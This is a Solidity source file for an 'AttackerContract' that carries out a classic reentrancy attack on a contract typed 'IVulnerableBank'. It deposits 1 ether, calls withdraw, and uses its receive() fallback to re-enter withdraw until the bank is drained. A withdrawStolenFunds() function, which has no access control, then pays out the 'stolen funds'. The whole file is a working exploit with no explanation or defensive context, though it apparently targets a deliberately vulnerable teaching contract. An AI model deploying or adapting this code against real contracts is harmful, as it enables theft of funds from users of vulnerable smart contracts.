// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract AttackerContract {
    IVulnerableBank public vulnerableBank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
    }

    // Function to attack the vulnerable contract
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ether to attack");
        vulnerableBank.deposit{value: ATTACK_AMOUNT}();
        vulnerableBank.withdraw(ATTACK_AMOUNT);
    }

    // Fallback function to handle the reentrancy
    receive() external payable {
        if (address(vulnerableBank).balance >= ATTACK_AMOUNT) {
            vulnerableBank.withdraw(ATTACK_AMOUNT);
        }
    }

    // Function to withdraw the stolen funds
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}